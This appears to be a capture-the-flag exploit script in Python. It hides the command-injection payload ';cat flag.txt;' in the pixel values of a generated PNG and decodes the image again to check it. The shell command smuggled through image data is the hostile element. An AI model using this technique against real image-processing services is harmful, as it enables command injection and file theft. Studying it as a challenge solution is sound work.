from PIL import Image
from PIL import PngImagePlugin
import stepic

# convert char to numberical value
def ctoi(char):
    # get the value
    value = char % 256
    # decide if we need to use a one or a zero
    value = 1 if value == 0 else value
    return value

# payload 
msg = b''';cat flag.txt;'''

# create malicious image using L mode
img = Image.new("L", (1,len(msg)))
# put data into one column and as many rows as needed for simplicitys sake
for i in range(len(msg)):
    # turn char to int and put pixel
    pixel_value = ctoi(msg[i])
    img.putpixel((0, i), pixel_value)

# save the image
img.save("test.png")

# open image for debugging
img = Image.open("test.png")
decoded_text = ""

# go over images numerical values and deconvert them
for i in range(img.size[1]):
    # get pixel val
    pixel_value = img.getpixel((0, i))
    # only read val if it's not zero
    if pixel_value != 0: 
        decoded_text += chr(pixel_value)

print(decoded_text)

